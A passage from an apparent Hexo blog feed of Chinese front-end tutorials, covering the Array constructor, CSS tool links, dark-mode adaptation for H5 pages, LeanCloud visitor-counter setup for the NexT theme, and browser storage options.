<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#x2F;&#x2F;渲染入口 代码仅供参考 </span><br><span class="line">function renderUI(initialData) &#123;</span><br><span class="line">   ReactDOM.hydrate(&lt;BrowserRouter&gt;&lt;Provider store&#x3D;&#123;initialData&#125;&gt;</span><br><span class="line">       &lt;Routes &#x2F;&gt;</span><br><span class="line">   &lt;&#x2F;Provider&gt;</span><br><span class="line">   &lt;&#x2F;BrowserRouter&gt;, document.getElementById(&#39;rootEle&#39;), (e) &#x3D;&gt; &#123;</span><br><span class="line">   &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>服务端同构渲染虽然可以提升首屏的出现时间，利于 SEO，对低端用户友好，但是开发复杂度有所提高，代码需要兼容双端运行（runtime）,还有一些库只能在浏览器端运行，在服务端加载会直接报错，这种情况就需要进行做一些特殊处理。</p>
<p>同时也会大大的增加服务端负载，当然这都容易解决，可以改用renderToNodeStream() 方法通过流式输出来提升服务端渲染性能，可以进行监控和扩容，所以是否需要 ssr 模式，还要看具体的产品线和用户定位。</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>Array 构造函数</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/Array%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<p>由于 <code>Array</code> 的构造函数在如何处理参数时有点模棱两可，因此总是推荐使用数组的字面语法 - <code>[]</code> - 来创建数组。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[1, 2, 3]; &#x2F;&#x2F; 结果: [1, 2, 3]</span><br><span class="line">new Array(1, 2, 3); &#x2F;&#x2F; 结果: [1, 2, 3]</span><br><span class="line"></span><br><span class="line">[3]; &#x2F;&#x2F; 结果: [3]</span><br><span class="line">new Array(3); &#x2F;&#x2F; 结果: [] </span><br><span class="line">new Array(&#39;3&#39;) &#x2F;&#x2F; 结果: [&#39;3&#39;]</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 因此下面的代码将会使人很迷惑</span><br><span class="line">new Array(3, 4, 5); &#x2F;&#x2F; 结果: [3, 4, 5] </span><br><span class="line">new Array(3) &#x2F;&#x2F; 结果: []，此数组长度为 3</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里的模棱两可指的是数组的<a href="https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Array">两种构造函数语法</a></p>
<p>由于只有一个参数传递到构造函数中（指的是 <code>new Array(3);</code> 这种调用方式），并且这个参数是数字，构造函数会返回一个 <code>length</code> 属性被设置为此参数的空数组。 需要特别注意的是，此时只有 <code>length</code> 属性被设置，真正的数组并没有生成。</p>
<p>在 Firebug 中，你会看到 <code>[undefined, undefined, undefined]</code>，这其实是不对的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var arr &#x3D; new Array(3);</span><br><span class="line">arr[1]; &#x2F;&#x2F; undefined</span><br><span class="line">1 in arr; &#x2F;&#x2F; false, 数组还没有生成</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这种优先于设置数组长度属性的做法只在少数几种情况下有用，比如需要循环字符串，可以避免 <code>for</code> 循环的麻烦。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">new Array(count + 1).join(stringToRepeat);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>new Array(3).join(&#39;#&#39;)</code> 将会返回 <code>##</code></p>
<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>应该尽量避免使用数组构造函数创建新数组。推荐使用数组的字面语法。它们更加短小和简洁，因此增加了代码的可读性。</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>CSS在线工具</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/CSS%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<h2 id="CSS-在线工具"><a href="#CSS-在线工具" class="headerlink" title="CSS 在线工具"></a>CSS 在线工具</h2><p><a href="http://apps.eky.hk/css-triangle-generator/zh-hant">CSS 三角形生成器</a></p>
<p><a href="http://code.ciaoca.com/style/hexcolor/">CSS 半透明背景色转换</a></p>
<p><a href="http://code.ciaoca.com/style/bubble/">CSS 气泡对话框生成器</a></p>
<p><a href="http://www.cssmatic.com/gradient-generator">CSS Matic 背景渐变色生成器</a></p>
<p><a href="http://www.colorzilla.com/gradient-editor/">ColorZilla CSS 背景渐变色生成器</a></p>
<p><a href="http://layerstyles.org/builder.html">Layer Styles CSS 阴影、边框、渐变背景生成器</a></p>
<p><a href="http://border-image.com/">CSS 图片边框生成器</a></p>
<p><a href="https://scotch.io/demos/visual-guide-to-css3-flexbox-flexbox-playground">Flexbox 演示</a></p>
<p><a href="http://the-echoplex.net/flexyboxes/">Flexbox 生成器</a></p>
<p><a href="http://css3generator.com/">CSS3 代码生成器</a></p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>H5项目适配系统深色模式方案</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/H5%E9%A1%B9%E7%9B%AE%E9%80%82%E9%85%8D%E7%B3%BB%E7%BB%9F%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<h2 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h2><blockquote>
<p>随着 iOS 13 的发布，深色模式（Dark Mode）越来越多地出现在大众的视野中，支持深色模式已经成为现代移动应用和网站的一个潮流，前段时间更是因为微信的适配再度引起热议。深色模式不仅可以大幅减少电量的消耗，减弱强光对比,还能 提供更好的可视性和沉浸感。</p>
</blockquote>
<p><code>如何切换深色模式</code></p>
<ul>
<li>iOS：“设置”–“显示与亮度”–“外观”，选择“深色”</li>
<li>Android：“系统设置”–“显示”–“深色模式”。</li>
</ul>
<h2 id="二、问题"><a href="#二、问题" class="headerlink" title="二、问题"></a>二、问题</h2><p>如果系统设置了深色模式，H5页面不做相应的处理，会出现背景色冲突、深色文字显示异常，深色图标显示异常等一些显示上的问题。</p>
<p>所以，需要对深色模式进行一些适配。</p>
<h2 id="三、H5项目适配深色模式方案"><a href="#三、H5项目适配深色模式方案" class="headerlink" title="三、H5项目适配深色模式方案"></a>三、H5项目适配深色模式方案</h2><h3 id="1-声明-color-scheme"><a href="#1-声明-color-scheme" class="headerlink" title="1.声明 color-scheme"></a>1.声明 color-scheme</h3><p><code>color-scheme</code>有两种方式。</p>
<h5 id="1-1-meta"><a href="#1-1-meta" class="headerlink" title="1.1 meta"></a>1.1 meta</h5><p>在head中声明<code>&lt;meta name=&quot;color-scheme&quot; content=&quot;light dark&quot;&gt;</code>，声明当前页面支持 light 和 dark 两种模式，系统切换到深色模式时，浏览器默认样式也会切换到深色；</p>
<h5 id="1-2-CSS"><a href="#1-2-CSS" class="headerlink" title="1.2 CSS"></a>1.2 CSS</h5><p>下面的 css 同样可以实现上面 meta 声明的效果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:root &#123;</span><br><span class="line">    color-scheme: light dark;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意：此声明并非为页面做自动适配，只影响浏览器默认样式<br>更多信息可查阅 W3C 文档 《CSS Color Adjustment Module Level 1》</p>
<h3 id="2-通过-CSS-媒体查询"><a href="#2-通过-CSS-媒体查询" class="headerlink" title="2.通过 CSS 媒体查询"></a>2.通过 CSS 媒体查询</h3><p><code>prefers-color-scheme</code> CSS 媒体特性用于检测用户是否有将系统的主题色设置为亮色或者暗色。</p>
<ul>
<li><code>no-preference</code><br>表示系统未得知用户在这方面的选项。在布尔值上下文中，其执行结果为 false。</li>
<li><code>light</code><br>表示用户已告知系统他们选择使用浅色主题的界面。</li>
<li><code>dark</code><br>表示用户已告知系统他们选择使用暗色主题的界面。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:root &#123;</span><br><span class="line">    color-scheme: light dark;</span><br><span class="line">    background: white;</span><br><span class="line">    color: black;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@media (prefers-color-scheme: dark) &#123;</span><br><span class="line">    :root &#123;</span><br><span class="line">        background: black;</span><br><span class="line">        color: white;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;颜色较多的情况，建议使用CSS变量对颜色值进行管理</span><br></pre></td></tr></table></figure>
<h3 id="3-图片适配"><a href="#3-图片适配" class="headerlink" title="3.图片适配"></a>3.图片适配</h3>利用<code>picture+source</code>标签，设置不同模式下的图片 url。</li>
</ul>
<p>HTML <code>&lt;picture&gt;</code>元素通过包含零或多个 <code>&lt;source&gt; </code>元素和一个<code>&lt;img&gt;</code>元素来为不同的显示/设备场景提供图像版本。浏览器会选择最匹配的子 <code>&lt;source&gt;</code> 元素，如果没有匹配的，就选择 <code>&lt;img&gt;</code> 元素的 src 属性中的URL。然后，所选图像呈现在<code>&lt;img&gt;</code>元素占据的空间中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;picture&gt;</span><br><span class="line">    &lt;!-- 深色模式下的图片 --&gt;</span><br><span class="line">    &lt;source srcset&#x3D;&quot;dark.jpg&quot; media&#x3D;&quot;(prefers-color-scheme: dark)&quot; &#x2F;&gt;</span><br><span class="line">    &lt;!-- 默认模式下的图片 --&gt;</span><br><span class="line">    &lt;img src&#x3D;&quot;light.jpg&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;picture&gt;</span><br></pre></td></tr></table></figure>
<h3 id="4-JavaScript中判断当前模式-amp-监听模式变化"><a href="#4-JavaScript中判断当前模式-amp-监听模式变化" class="headerlink" title="4. JavaScript中判断当前模式&amp;监听模式变化"></a>4. JavaScript中判断当前模式&amp;监听模式变化</h3><h5 id="4-1-matchMedia"><a href="#4-1-matchMedia" class="headerlink" title="4.1 matchMedia"></a>4.1 matchMedia</h5><p>Window 的<code>matchMedia() </code>方法返回一个新的<code>MediaQueryList </code>对象，表示指定的媒体查询 (en-US)字符串解析后的结果。返回的<code>MediaQueryList </code>可被用于判定Document是否匹配媒体查询，或者监控一个<code>document</code> 来判定它匹配了或者停止匹配了此媒体查询。</p>
<h5 id="4-2-addListener"><a href="#4-2-addListener" class="headerlink" title="4.2 addListener()"></a>4.2 addListener()</h5><p><code>MediaQueryList</code>接口的<code>addListener()</code>方法向<code>MediaQueryListener</code>添加一个侦听器，该侦听器将运行自定义回调函数以响应媒体查询状态的更改。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#JavaScript监听判断</span><br><span class="line">const mediaQuery &#x3D; window.matchMedia(&#39;(prefers-color-scheme: dark)&#39;)</span><br><span class="line"></span><br><span class="line">function darkModeHandler() &#123;</span><br><span class="line">    if (mediaQuery.matches) &#123;</span><br><span class="line">        console.log(&#39;现在是深色模式&#39;)</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        console.log(&#39;现在是浅色模式&#39;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 判断当前模式</span><br><span class="line">darkModeHandler()</span><br><span class="line">&#x2F;&#x2F; 监听模式变化</span><br><span class="line">mediaQuery.addListener(darkModeHandler)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>原文：<a href="https://jishuin.proginn.com/p/763bfbd567d0">https://jishuin.proginn.com/p/763bfbd567d0</a></p>
</blockquote>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>Hexo Next leancloud文章阅读次数配置</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/HexoNextleancloud%E6%96%87%E7%AB%A0%E9%98%85%E8%AF%BB%E6%AC%A1%E6%95%B0%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于<code>Next</code>主题修复了<code>leancloud</code>的安全问题, 导致以前<code>leancloud</code>失效, 所以重新介绍如何配置<code>leancloud</code></p>
<blockquote>
<p>所有使用该插件而未经修复的NexT站点或使用类似方法集成Leancloud访客统计功能的站点都被认为是不安全的，请尽快修复</p>
</blockquote>
<p>效果如图<br><img src="https://upload-images.jianshu.io/upload_images/10024246-4c34cbaf05fa0929.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h1 id="注册Leancloud并创建应用"><a href="#注册Leancloud并创建应用" class="headerlink" title="注册Leancloud并创建应用"></a>注册Leancloud并创建应用</h1><ol>
<li><p> 首先，前往Leancloud官网<a href="https://leancloud.cn/dashboard/login.html#/signup">leancloud.cn</a>进行注册，并登陆。</p>
</li>
<li><p>点击<strong>创建应用</strong><br> <img src="https://upload-images.jianshu.io/upload_images/10024246-89aca6e79e05f569.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
</li>
<li><p>输入应用的名称(随便起都行), 选择<strong>开发版</strong>, 点击<strong>创建</strong><br> <img src="https://upload-images.jianshu.io/upload_images/10024246-097016813d541b77.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
</li>
<li><p>创建成功后点击右上角的设置<strong>小齿轮</strong><br> <img src="https://upload-images.jianshu.io/upload_images/10024246-3db198f1151cdcbf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
</li>
<li><p>点击<strong>存储</strong>-<strong>创建Class</strong>-<strong>Class名称</strong>设置为<code>Counter</code>(必须为<code>Counter</code>)-选择<strong>无限制</strong>-点击<strong>创建</strong><br> <img src="https://upload-images.jianshu.io/upload_images/10024246-432bb8b837df5c25.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
</li>
<li><p>创建后点击<strong>设置</strong>-点击<strong>应用Key</strong>-获取<strong>App ID</strong>和<strong>App Key</strong><br> <img src="https://upload-images.jianshu.io/upload_images/10024246-9535fa3e0ed7959c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
</li>
<li><p>将获取到的<strong>App ID</strong>和<strong>App Key</strong>设置到<code>Next</code>主题配置文件<code>_config.yml</code><br> <em>配置文件已存在这个配置, 只要把id和key加上去就好了</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">leancloud_visitors:</span><br><span class="line"> enable: true</span><br><span class="line"> app_id: &lt;&lt;your app id&gt;&gt;</span><br><span class="line"> app_key: &lt;&lt;your app key&gt;&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>点击<strong>安全中心</strong>, 填写自己博客对应的域名（注意协议、域名和端口号需严格一致）<br> <img src="https://upload-images.jianshu.io/upload_images/10024246-0a2fe8df57f0f3c6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
</li>
<li><p>点击<strong>云引擎</strong>-点击<strong>部署</strong>-点击<strong>在线编辑</strong><br> <img src="https://upload-images.jianshu.io/upload_images/10024246-e403d7af8cb3c367.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
</li>
<li><p> 点击<strong>创建函数</strong>-选择<strong>Hook</strong>-AV.Cloud.选择<strong>beforeSave</strong>-类选择<strong>Counter</strong>-<strong>添加代码</strong>-点击<strong>保存</strong></p>
</li>
</ol>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-fd6294350d1575b8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-e68e0a9d45123d5a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var query &#x3D; new AV.Query(&quot;Counter&quot;);</span><br><span class="line">if (request.object.updatedKeys.indexOf(&#39;time&#39;) !&#x3D;&#x3D; -1) &#123;</span><br><span class="line">     return query.get(request.object.id).then(function (obj) &#123;</span><br><span class="line">     if (obj.get(&quot;time&quot;) + 1 !&#x3D;&#x3D; request.object.get(&quot;time&quot;)) &#123;</span><br><span class="line">     throw new AV.Cloud.Error(&#39;Invalid update!&#39;);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="11">
<li>点击<strong>部署</strong><br><img src="https://upload-images.jianshu.io/upload_images/10024246-6f2cb6e065606ee4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></li>
</ol>
<pre><code>![](https://upload-images.jianshu.io/upload_images/10024246-7f0f70d529036253.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
</code></pre>
<ol start="12">
<li>待出现红框处的成功部署信息后，点击<strong>关闭</strong><br><img src="https://upload-images.jianshu.io/upload_images/10024246-74bb624ee196b414.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></li>
</ol>
<h1 id="设置权限"><a href="#设置权限" class="headerlink" title="设置权限"></a>设置权限</h1><ol>
<li> 打开<code>Next</code>主题配置文件<code>_config.yml</code>, 将leancloud_visitors下的security设置为true（如没有则新增）</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">leancloud_visitors:</span><br><span class="line"> enable: true</span><br><span class="line"> app_id: &lt;&lt;your app id&gt;&gt; # 同前文的id</span><br><span class="line"> app_key: &lt;&lt;your app key&gt;&gt; # 同前文的key</span><br><span class="line"> # Dependencies: https:&#x2F;&#x2F;github.com&#x2F;theme-next&#x2F;hexo-leancloud-counter-security</span><br><span class="line"> security: true</span><br><span class="line"> # 由于Leancloud免费版的云引擎存在请求线程数和运行时间限制以及休眠机制，</span><br><span class="line"> # 很多时候访客数量加载会很慢。</span><br><span class="line"> # 如果设置betterPerformance为true，</span><br><span class="line"> # 则网页则会在提交请求之前直接显示访客人数为查询到的人数+1，以增加用户体验。</span><br><span class="line"> betterPerformance: false</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p> 打开站点配置文件<code>_config.yml</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">leancloud_counter_security:</span><br><span class="line"> enable_sync: true</span><br><span class="line"> app_id: &lt;&lt;your app id&gt;&gt;   # 同前文的id</span><br><span class="line"> app_key: &lt;&lt;your app key&gt;&gt; # 同前文的key</span><br><span class="line"> username: </span><br><span class="line"> password:</span><br></pre></td></tr></table></figure></li>
<li><p> 打开命令行<code>cmd</code>并进入站点文件夹，键入以下命令以安装<code>hexo-leancloud-counter-security</code>插件</p>
</li>
</ol>
<p>复制 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-leancloud-counter-security --save</span><br></pre></td></tr></table></figure>

<ol start="4">
<li> 接着键入命令<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo lc-counter register &lt;&lt;username&gt;&gt; &lt;&lt;password&gt;&gt;</span><br></pre></td></tr></table></figure></li>
</ol>
<p><strong>PS:</strong> 将<code>&lt;&lt;username&gt;&gt;</code>和<code>&lt;&lt;password&gt;&gt;</code>替换为你自己的用户名和密码（不必与leancloud的账号）相同。<strong>此用户名和密码将在hexo部署时使用。</strong></p>
<ol start="5">
<li> 打开站点配置文件<code>_config.yml</code>, 将<code>&lt;&lt;username&gt;&gt;</code>和<code>&lt;&lt;password&gt;&gt;</code>替换为你刚刚设置的用户名和密码</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">leancloud_counter_security:</span><br><span class="line"> enable_sync: true</span><br><span class="line"> app_id: &lt;&lt;your app id&gt;&gt;   # 同前文的id</span><br><span class="line"> app_key: &lt;&lt;your app key&gt;&gt; # 同前文的key</span><br><span class="line"> username: &lt;&lt;username&gt;&gt;    #如留空则将在部署时询问</span><br><span class="line"> password: &lt;&lt;password&gt;&gt;    #建议留空以保证安全性，如留空则将在部署时询问</span><br></pre></td></tr></table></figure>

<ol start="6">
<li><p>返回Leancloud控制台的应用内, 检查_User表中是否出现一条记录（图示以用户名为admin为例）<br> <img src="https://upload-images.jianshu.io/upload_images/10024246-999c5edc89f7b563.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
</li>
<li><p>进入<strong>Counter</strong>表, 打开<strong>权限设置</strong><br> <img src="https://upload-images.jianshu.io/upload_images/10024246-787b5c61ae91e7f2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p> <img src="https://upload-images.jianshu.io/upload_images/10024246-37f02ef456350fe9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p> <img src="https://upload-images.jianshu.io/upload_images/10024246-65c41acaf06d5c02.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p> <img src="https://upload-images.jianshu.io/upload_images/10024246-7f8593a5f8c45141.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
</li>
</ol>
<p><strong>至此配置完成</strong></p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>Web 存储方案简介</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/Web%E5%AD%98%E5%82%A8%E6%96%B9%E6%A1%88%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>HTTP Cookie（也叫 Web Cookie 或浏览器 Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。</p>
<h5 id="Cookie-主要用于以下三个方面："><a href="#Cookie-主要用于以下三个方面：" class="headerlink" title="Cookie 主要用于以下三个方面："></a>Cookie 主要用于以下三个方面：</h5><ul>
<li><p>会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）；</p>
</li>
<li><p>个性化设置（如用户自定义设置、主题等）；</p>
</li>
<li><p>浏览器行为跟踪（如跟踪分析用户行为等）。</p>
<h5 id="Cookie-的特点："><a href="#Cookie-的特点：" class="headerlink" title="Cookie 的特点："></a>Cookie 的特点：</h5></li>
<li><p>Cookie 的大小受限，一般为 4 KB；</p>
</li>
<li><p>同一个域名下存放 Cookie 的个数是有限制的，不同浏览器的个数不一样，一般为 20 个；</p>
</li>
<li><p>Cookie 支持设置过期时间，当过期时自动销毁；</p>
</li>
<li><p>每次发起同域下的 HTTP 请求时，都会携带当前域名下的 Cookie；</p>
</li>
<li><p>支持设置为 HttpOnly，防止 Cookie 被客户端的 JavaScript 访问。</p>
<h5 id="示例1：简单用法"><a href="#示例1：简单用法" class="headerlink" title="示例1：简单用法"></a>示例1：简单用法</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.cookie &#x3D; &quot;name&#x3D;semlinker&quot;;</span><br><span class="line">document.cookie &#x3D; &quot;favorite_food&#x3D;tripe&quot;;</span><br><span class="line"></span><br><span class="line">alert(document.cookie);</span><br><span class="line">&#x2F;&#x2F; 显示: name&#x3D;semlinker;favorite_food&#x3D;tripe</span><br></pre></td></tr></table></figure>
<h5 id="示例2：得到名为-test2-的-cookie"><a href="#示例2：得到名为-test2-的-cookie" class="headerlink" title="示例2：得到名为 test2 的 cookie"></a>示例2：得到名为 test2 的 cookie</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.cookie &#x3D; &quot;test1&#x3D;Hello&quot;;</span><br><span class="line">document.cookie &#x3D; &quot;test2&#x3D;World&quot;;</span><br><span class="line"></span><br><span class="line">var myCookie &#x3D; document.cookie</span><br><span class="line">    .replace(&#x2F;(?:(?:^|.*;\s*)test2\s*\&#x3D;\s*([^;]*).*$)|^.*$&#x2F;, &quot;$1&quot;);</span><br><span class="line">alert(myCookie);</span><br></pre></td></tr></table></figure>
<h2 id="localStorage"><a href="#localStorage" class="headerlink" title="localStorage"></a>localStorage</h2><p>一种持久化的存储方式，也就是说如果不手动清除，数据就永远不会过期。它是采用键值对的方式存储数据，按域名将数据分别保存到对应数据库文件里。相比 Cookie 来说，它能保存更大的数据。</p>
</li>
</ul>
<h5 id="localStorage-的特点："><a href="#localStorage-的特点：" class="headerlink" title="localStorage 的特点："></a>localStorage 的特点：</h5><ul>
<li>大小限制为 5MB ~10MB；</li>
<li>在同源的所有标签页和窗口之间共享数据；</li>
<li>数据仅保存在客户端，不与服务器进行通信；</li>
<li>数据持久存在且不会过期，重启浏览器后仍然存在；</li>
<li>对数据的操作是同步的。<br>#####示例<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 通过setItem()增加一个数据项</span><br><span class="line">localStorage.setItem(&#39;myName&#39;, &#39;Semlinker&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 通过getItem()获取某个数据项</span><br><span class="line">let me &#x3D; localStorage.getItem(&#39;myName&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 通过removeItem()移除某个数据项</span><br><span class="line">localStorage.removeItem(&#39;myName&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 移除所有数据项</span><br><span class="line">localStorage.clear();</span><br></pre></td></tr></table></figure>
<h2 id="sessionStorage"><a href="#sessionStorage" class="headerlink" title="sessionStorage"></a>sessionStorage</h2>与服务端的 session 类似，sessionStorage 是一种会话级别的缓存，关闭浏览器时数据会被清除。需要注意的是 sessionStorage 的作用域是窗口级别的，也就是说不同窗口之间保存的 sessionStorage 数据是不能共享的。</li>
</ul>
<h5 id="sessionStorage-的特点："><a href="#sessionStorage-的特点：" class="headerlink" title="sessionStorage 的特点："></a>sessionStorage 的特点：</h5><ul>
<li>sessionStorage 的数据只存在于当前浏览器的标签页；</li>
<li>数据在页面刷新后依然存在，但在关闭浏览器标签页之后数据就会被清除；</li>
<li>与 localStorage 拥有统一的 API 接口；</li>
<li>对数据的操作是同步的。<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 通过setItem()增加一个数据项</span><br><span class="line">sessionStorage.setItem(&#39;myName&#39;, &#39;Semlinker&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 通过getItem()获取某个数据项</span><br><span class="line">let me &#x3D; sessionStorage.getItem(&#39;myName&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 通过removeItem()移除某个数据项</span><br><span class="line">sessionStorage.removeItem(&#39;myName&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 移除所有数据项</span><br><span class="line">sessionStorage.clear();</span><br></pre></td></tr></table></figure>
<h2 id="Web-SQL"><a href="#Web-SQL" class="headerlink" title="Web SQL"></a>Web SQL</h2>Web SQL 数据库 API 实际上不是 HTML5 规范的一部分，而是一个单独的规范，它引入了一组 API 来使用 SQL 来操作客户端数据库。需要注意的是，HTML5 已经放弃 Web SQL 数据库。</li>
</ul>
<p>Web SQL Database 规范中定义的三个核心方法：</p>
<ul>
<li><p>openDatabase：这个方法使用现有数据库或新建数据库来创建数据库对象；</p>
</li>
<li><p>transaction：这个方法允许我们根据情况控制事务的提交或回滚；</p>
</li>
<li><p>executeSql：这个方法用于执行真实的 SQL 语句。</p>
<h5 id="Web-SQL-的特点（相比-Cookie、localStorage-与-sessionStorage）："><a href="#Web-SQL-的特点（相比-Cookie、localStorage-与-sessionStorage）：" class="headerlink" title="Web SQL 的特点（相比 Cookie、localStorage 与 sessionStorage）："></a>Web SQL 的特点（相比 Cookie、localStorage 与 sessionStorage）：</h5></li>
<li><p>Web SQL 能方便进行对象存储；</p>
</li>
<li><p>Web SQL 支持事务，能方便地进行数据查询和数据处理操作。</p>
<h5 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var db &#x3D; openDatabase(&#39;mydb&#39;, &#39;1.0&#39;, &#39;Test DB&#39;, 2 * 1024 * 1024);</span><br><span class="line"></span><br><span class="line">db.transaction(function (tx) &#123; </span><br><span class="line">   &#x2F;&#x2F; 执行查询操作</span><br><span class="line">   tx.executeSql(&#39;CREATE TABLE IF NOT EXISTS LOGS (id unique, log)&#39;); </span><br><span class="line">   &#x2F;&#x2F; 执行插入操作</span><br><span class="line">   tx.executeSql(&#39;INSERT INTO LOGS (id, log) VALUES (1, &quot;foobar&quot;)&#39;); </span><br><span class="line">   tx.executeSql(&#39;INSERT INTO LOGS (id, log) VALUES (2, &quot;logmsg&quot;)&#39;); </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h2 id="IndexedDB"><a href="#IndexedDB" class="headerlink" title="IndexedDB"></a>IndexedDB</h2><p>IndexedDB 是一种底层 API，用于客户端存储大量结构化数据，包括文件、二进制大型对象。该 API 使用索引来实现对该数据的高性能搜索。虽然 Web Storage 对于存储较少量的数据很有用，但对于存储更大量的结构化数据来说，这种方法不太好用。IndexedDB 提供了一个解决方案。</p>
</li>
</ul>
<h5 id="IndexedDB-的特点："><a href="#IndexedDB-的特点：" class="headerlink" title="IndexedDB 的特点："></a>IndexedDB 的特点：</h5><ul>
<li>存储空间大：存储空间可以达到几百兆甚至更多；</li>
<li>支持二进制存储：它不仅可以存储字符串，而且还可以存储二进制数据；</li>
<li>IndexedDB 有同源限制，每一个数据库只能在自身域名下能访问，不能跨域名访问；</li>
<li>支持事务型：IndexedDB 执行的操作会按照事务来分组的，在一个事务中，要么所有的操作都成功，要么所有的操作都失败；</li>
<li>键值对存储：IndexedDB 内部采用对象仓库（object store）存放数据。所有类型的数据都可以直接存入，包括 JavaScript 对象。对象仓库中，数据以 “键值对” 的形式保存，每一个数据记录都有对应的主键，主键是独一无二的，不能有重复，否则会抛出一个错误。</li>
